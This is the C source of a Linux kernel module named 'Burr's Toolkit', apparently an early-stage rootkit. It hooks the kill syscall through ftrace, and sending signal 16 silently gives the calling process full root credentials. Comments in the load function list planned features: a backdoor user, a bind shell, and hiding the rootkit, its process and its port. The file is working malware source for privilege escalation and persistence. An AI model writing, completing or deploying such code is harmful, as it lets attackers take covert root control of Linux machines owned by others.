#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/syscalls.h>
#include <linux/namei.h>
#include <linux/syscalls.h>
#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Burr");
MODULE_DESCRIPTION("Burr's Toolkit");
MODULE_VERSION("1.00");

void killFn(int sig);

//Set PTREGS_SYSCALL_STUBS to 1 for new hooking methods
#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*ogKill)(const struct pt_regs *);
asmlinkage int hookKill(const struct pt_regs *regs) {
    int sig = regs->si;
    killFn(sig);
    return ogKill(regs);
}
#else
static asmlinkage long (*ogKill)(pid_t pid, int sig);
asmlinkage int hookKill(pid_t pid, int sig) { 
    killFn(sig);
    return ogKill(pid, sig);
}
#endif

void killFn(int sig) {
    if (sig == 16) {
        struct cred *root;
        root = prepare_creds();
        printk(KERN_INFO "btk::0x1");
        if (root == NULL)
            return;
        root->uid.val = root->gid.val = 0;
        root->euid.val = root->egid.val = 0;
        root->suid.val = root->sgid.val = 0;
        root->fsuid.val = root->fsgid.val = 0;
        commit_creds(root);
    }
    return;
}

static struct ftrace_hook hooks[] = {
    HOOK("sys_kill", hookKill, &ogKill)
};

static int __init load(void) {
    //Create backdoor user
    //Create backdoor bind shell
    //Chmod, Chattr, NoClobber and Mount Bind root folder
    //Hide rootkit
    //Hide process
    //Hide listening port
    //Hide bind shell
    //Hook sys_write

    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err)
        return err;
    printk(KERN_INFO "Hello world!\n");
    return 0;
}

static void __exit unload(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "Goodbye world!\n");
    return;
}

module_init(load);
module_exit(unload);
